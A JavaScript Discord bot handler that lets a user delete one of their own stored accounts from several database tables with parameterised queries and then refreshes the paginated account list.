const { queryParams } = require("../../../db/database");
const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");

module.exports = {
    name: "deletefinal",
    callback: async (client, interaction) => {
        let [t, id, current, uid] = interaction.customId.split("|");
        if (id && id !== interaction.user.id) {
            return interaction.reply({ content: "You can only delete your own accounts.", ephemeral: true });
        }
        const ownerId = interaction.user.id;
        current = parseInt(current);

        await queryParams(`DELETE FROM accountsbyuser WHERE user_id=? AND uid=?`, [ownerId, uid]);
        await queryParams(`DELETE FROM accounts WHERE uid=? AND user_id=?`, [uid, ownerId]);
        await queryParams(`DELETE FROM extrainformation WHERE uid=? AND (user_id=? OR NOT EXISTS (SELECT 1 FROM accounts WHERE uid=?))`, [uid, ownerId, uid]);
        await queryParams(`DELETE FROM status WHERE uid=? AND NOT EXISTS (SELECT 1 FROM accounts WHERE uid=?)`, [uid, uid]);

        const remainingAccounts = await queryParams(`SELECT * FROM accountsbyuser WHERE user_id=?`, [ownerId]);

        if (remainingAccounts.length === 0) {
            current = 1;
        } else if (current > remainingAccounts.length) {
            current = remainingAccounts.length;
        }

        return interaction.update(await accountsmsg(ownerId, current));
    }
};